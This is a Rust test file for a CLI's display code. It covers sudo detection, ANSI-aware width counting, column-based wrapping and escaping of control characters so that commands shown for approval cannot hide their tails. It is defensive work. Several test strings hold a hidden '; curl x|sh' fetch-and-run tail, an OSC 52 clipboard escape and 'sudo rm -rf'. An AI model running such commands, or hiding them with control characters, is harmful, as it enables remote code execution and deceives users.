// ── cli module tests ──────────────────────────────────────────────────────────

use crate::cli::markdown::MarkdownRenderer;
use crate::cli::render::*;
use crate::daemon::utils::command_has_sudo;

// ── command_has_sudo ──────────────────────────────────────────────────────────

#[test]
fn command_has_sudo_simple_cli() {
    assert!(command_has_sudo("sudo apt install vim"));
}

#[test]
fn command_has_sudo_in_pipeline_cli() {
    assert!(command_has_sudo("echo hi | sudo tee /etc/hosts"));
}

#[test]
fn command_has_sudo_after_semicolon_cli() {
    assert!(command_has_sudo("cd /tmp; sudo rm -rf foo"));
}

#[test]
fn command_has_sudo_false_positive_guard_cli() {
    // "sudoers" is not "sudo" — word-boundary must hold.
    assert!(!command_has_sudo("cat /etc/sudoers"));
}

#[test]
fn command_has_sudo_no_sudo_cli() {
    assert!(!command_has_sudo("ls -la /home"));
}

// ── visual_len ────────────────────────────────────────────────────────────────

#[test]
fn visual_len_plain_ascii() {
    assert_eq!(visual_len("hello"), 5);
}

#[test]
fn visual_len_empty_string() {
    assert_eq!(visual_len(""), 0);
}

#[test]
fn visual_len_strips_ansi_reset() {
    // "\x1b[0m" is an ANSI reset — it contributes 0 visual columns.
    assert_eq!(visual_len("\x1b[0mhello"), 5);
}

#[test]
fn visual_len_strips_ansi_colour() {
    assert_eq!(visual_len("\x1b[31mred\x1b[0m"), 3);
}

#[test]
fn visual_len_strips_bold() {
    assert_eq!(visual_len("\x1b[1mbold text\x1b[0m"), 9);
}

#[test]
fn visual_len_nested_escape_sequences() {
    // Two different ANSI sequences around some text.
    let s = "\x1b[1m\x1b[32mgreen bold\x1b[0m\x1b[0m";
    assert_eq!(visual_len(s), 10);
}

#[test]
fn visual_len_no_escape_inside_word() {
    // "DaemonEye" has no escapes — all 9 chars count.
    assert_eq!(visual_len("DaemonEye"), 9);
}

// ── wrap_display ──────────────────────────────────────────────────────────────

/// The display width of a wrapped row, using the same measure as the wrapper.
fn row_width(row: &str) -> usize {
    use unicode_width::UnicodeWidthStr;
    row.width()
}

#[test]
fn wrap_display_counts_columns_not_chars() {
    // 36 CJK chars are 72 columns: at width 20 that is three full rows of
    // 10 chars (20 columns) and one of 6 (12 columns) — not three rows of
    // 20 chars (40 columns each).
    let input = "漢".repeat(36);
    let rows = wrap_display(&input, 20);
    assert_eq!(rows.iter().map(|r| row_width(r)).max(), Some(20));
    assert_eq!(rows.join(""), input);
    assert_eq!(rows.iter().map(|r| r.chars().count()).max(), Some(10));
}

#[test]
fn wrap_display_never_splits_a_wide_char() {
    // CJK at an odd width (5): each row holds two of them (4 columns) —
    // a wide character is never split across the edge.
    let input = "漢".repeat(12);
    let rows = wrap_display(&input, 5);
    for row in &rows {
        assert!(row_width(row) <= 5, "row too wide: {row:?}");
        assert_eq!(row_width(row), 4, "each row holds two CJK chars: {row:?}");
    }
    assert_eq!(rows.join(""), input);
}

#[test]
fn wrap_display_shows_control_characters() {
    // S1's ESC example: everything after the ESC was zero-width to the old
    // wrapper, so the tail vanished. The tail must be visible on screen; the
    // escape form is 5 columns wide, so the tail may land on the next row —
    // visible across rows is the property, same-row is not required.
    let cases: Vec<(String, usize)> = vec![
        ("echo ok \x1b          ; curl x|sh".to_string(), 20),
        ("echo \x07 ok ; curl x|sh".to_string(), 22),
        ("echo \t ok ; curl x|sh".to_string(), 20),
        ("echo \x7f ok ; curl x|sh".to_string(), 20),
        ("echo \u{9b}5m ok ; curl x|sh".to_string(), 20),
        ("echo \u{202e}ok ; curl x|sh".to_string(), 20),
    ];
    for (command, width) in cases {
        let raw_control: Vec<char> = command
            .chars()
            .filter(|c| c.is_control() || ('\u{80}'..='\u{9f}').contains(c))
            .collect();
        let rows = wrap_display(&command, width);
        let joined = rows.join("");
        for c in raw_control {
            let shown = match c {
                '\x1b' => "\\x1b".to_string(),
                '\x07' => "\\u{7}".to_string(),
                '\t' => "\\t".to_string(),
                '\x7f' => "\\x7f".to_string(),
                '\u{9b}' => "\\u{9b}".to_string(),
                _ => format!("\\u{{{:x}}}", c as u32),
            };
            assert!(
                joined.contains(&shown),
                "control char {c:?} shown as {shown:?}: {rows:?}"
            );
            assert!(
                !rows.iter().any(|r| r.contains(c)),
                "no row contains the raw control char {c:?}: {rows:?}"
            );
        }
        let head = joined.find("curl").expect("command head visible");
        let tail = joined.rfind("sh").expect("command tail visible");
        assert!(
            tail > head,
            "the whole command is visible, head before tail: {rows:?}"
        );
        for row in &rows {
            assert!(
                row_width(row) <= width,
                "no row wider than {width}: {row:?}"
            );
        }
    }
}

#[test]
fn wrap_display_leaves_plain_text_alone() {
    let input = "hello é world\nsecond 漢 line 🦀 tail";
    let rows = wrap_display(input, 40);
    assert_eq!(
        rows,
        vec![
            "hello é world".to_string(),
            "second 漢 line 🦀 tail".to_string(),
        ],
        "plain text passes through row for row"
    );
}

#[test]
fn wrap_display_empty_input_is_one_empty_row() {
    assert_eq!(wrap_display("", 20), vec![String::new()]);
}

// ── terminal-restore (M36 phase-09, S9): the escaping function ───────────────

#[test]
fn terminal_restore_once_escapes_controls() {
    let raw = "ls \x1b]52;c;aGk=\x07";
    let out = escape_controls(raw);
    assert!(out.contains("ls "), "the command head survives: {out:?}");
    assert!(
        !out.bytes().any(|b| b == 0x1b || b == 0x07),
        "no raw ESC or BEL byte survives: {out:?}"
    );
    assert_eq!(escape_controls("a\nb"), "a\nb", "\\n is kept");
    assert_eq!(
        escape_controls("plain text"),
        "plain text",
        "plain text is unchanged"
    );
}

// ── display_wrap: M36 phase-05b (B8, P6, L6) ────────────────────────────────

/// The display width of a styled row: the sum over its spans of each span's
/// text width. Styled spans must count only their text.
fn line_width(line: &ratatui::text::Line<'_>) -> usize {
    line.spans
        .iter()
        .map(|s| unicode_width::UnicodeWidthStr::width(s.content.as_ref()))
        .sum()
}

fn line_text(line: &ratatui::text::Line<'_>) -> String {
    line.spans.iter().map(|s| s.content.as_ref()).collect()
}

#[test]
fn display_wrap_code_block_body_wraps() {
    let mut md = MarkdownRenderer::new();
    let width = 80;
    let body = "x".repeat(200);
    let _ = md.feed_to_lines("```bash\n", width);
    let lines = md.feed_to_lines(&format!("{body}\n"), width);
    assert!(lines.len() >= 3, "200 columns at width 80 wraps: {lines:?}");
    for line in &lines {
        assert!(
            line_width(line) <= 80,
            "row {} columns exceeds width 80: {:?}",
            line_width(line),
            line_text(line)
        );
    }
    let joined: String = lines.iter().map(|l| line_text(l)).collect();
    assert_eq!(joined, body, "the rows join back to the line");
}

#[test]
fn display_wrap_heading_wraps() {
    let mut md = MarkdownRenderer::new();
    let lines = md.feed_to_lines(&format!("## {}\n", "word ".repeat(40)), 80);
    assert!(lines.len() >= 2, "a long heading wraps: {lines:?}");
    let mut heading_rows = 0;
    for line in &lines {
        if line_text(line).is_empty() {
            continue;
        }
        heading_rows += 1;
        assert!(
            line_width(line) <= 80,
            "heading row {} columns exceeds 80: {:?}",
            line_width(line),
            line_text(line)
        );
        assert!(
            line.spans
                .iter()
                .all(|s| s.style.add_modifier == ratatui::style::Modifier::BOLD),
            "every heading row stays bold: {line:?}"
        );
    }
    assert!(heading_rows >= 2, "the heading text spans several rows");
}

#[test]
fn display_wrap_long_word_breaks() {
    let url = "a".repeat(150);
    let forms = [
        format!("see {url} here"),
        format!("- see {url} here"),
        format!("1. see {url} here"),
        format!("> see {url} here"),
    ];
    for form in forms {
        let mut md = MarkdownRenderer::new();
        let lines = md.feed_to_lines(&format!("{form}\n"), 80);
        assert!(
            lines.len() >= 2,
            "a 150-char URL wraps: {form:?} -> {lines:?}"
        );
        for line in &lines {
            assert!(
                line_width(line) <= 80,
                "row {} columns exceeds 80 in {form:?}: {:?}",
                line_width(line),
                line_text(line)
            );
        }
        let joined: String = lines.iter().map(|l| line_text(l)).collect();
        assert_eq!(
            joined.chars().filter(|c| *c == 'a').count(),
            150,
            "the URL is intact across the rows: {joined:?}"
        );
    }
}

#[test]
fn display_wrap_cjk_prose_by_columns() {
    let mut md = MarkdownRenderer::new();
    let prose = "漢".repeat(60);
    let lines = md.feed_to_lines(&format!("{prose}\n"), 80);
    assert!(lines.len() >= 2, "120 columns at width 80 wraps: {lines:?}");
    for line in &lines {
        assert!(
            line_width(line) <= 80,
            "row {} columns exceeds 80: {:?}",
            line_width(line),
            line_text(line)
        );
    }
}

#[test]
fn display_wrap_visual_len_counts_columns() {
    assert_eq!(visual_len("漢字"), 4, "CJK chars count 2 columns each");
    let styled = "\x1b[1mword\x1b[0m";
    assert_eq!(
        visual_len(styled),
        4,
        "SGR-wrapped text counts its text only"
    );
}
